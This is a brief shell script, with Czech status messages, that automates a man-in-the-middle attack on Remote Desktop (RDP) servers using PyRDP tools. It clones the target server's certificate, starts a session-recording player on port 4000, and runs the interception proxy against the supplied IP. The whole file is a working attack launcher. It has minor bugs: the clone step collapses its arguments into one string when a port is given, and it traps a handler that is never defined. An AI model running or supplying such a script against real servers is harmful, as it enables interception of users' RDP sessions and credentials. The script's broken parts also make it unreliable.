#!/bin/sh

##### export copymen="pyrdp-clonecert.py"
if [ "$1" != "" ]; then 
	echo "IP server: $1"
else 
	echo "Nebyl zadan potrebny argument \n"
	exit 2
fi
echo "Running clone certificat.."
if [ "$2" != "" ]; then
       	echo "port:  $2"
	python bin/pyrdp-clonecert.py "$1 -p $2 cert.pem -o key.pem"; 
else
	echo "port 3389"
	python bin/pyrdp-clonecert.py "$1" "cert.pem" "-o" "key.pem";
fi	
echo "certificat cloned"
echo "running lisner.."
python bin/pyrdp-player.py "-p" "4000" &
trap sig_handler 15
echo "running MITM"
python bin/pyrdp-mitm.py "$1" "-i" "127.0.0.1" "-d" "4000" "-k" "key.pem" "-c" "cert.pem"

#python bin/pyrdp-player.py "-p" "4000" &

